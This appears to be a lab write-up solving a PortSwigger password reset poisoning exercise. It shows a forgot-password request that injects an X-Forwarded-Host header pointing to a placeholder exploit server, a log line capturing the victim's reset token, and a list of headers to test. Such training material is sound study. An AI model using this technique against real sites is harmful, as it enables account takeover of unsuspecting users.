This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

[](https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-other-authentication-mechanisms/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware#) 

---------------------

####  Solution 


The server uses the `X-Forwarded-Host` header to build the password reset link. By injecting your exploit server’s hostname, the reset link in the victim’s email points to your server instead of the real site. When the victim clicks it, the token arrives in your access log.

Request a password reset for the target user with `X-Forwarded-Host` set to your server. Grab the token from your access log. Plug it into the real site’s reset URL to change their password.

```
POST /forgot-password
X-Forwarded-Host: YOUR-EXPLOIT-SERVER.net

username=carlos
```

The vulnerability is the server blindly trusting the `X-Forwarded-Host` header to generate URLs instead of using its own hostname. It’s host header injection applied to password reset functionality.

![](../../images/Pasted%20image%2020261022162432.png)

```
10.0.4.179      2026-10-22 13:20:05 +0000 "GET /exploit/forgot-password?temp-forgot-password-token=w8m0dnbqtypd5dxpf3aen9cny3jsye48 HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36"
```

When you see password reset functionality, one of the things you always try is adding headers that might influence how the server builds URLs:

- `X-Forwarded-Host`
- `X-Host`
- `X-Forwarded-Server`
- `Host` (duplicate it with a different value)
- `X-Original-URL`
- `X-Rewrite-URL`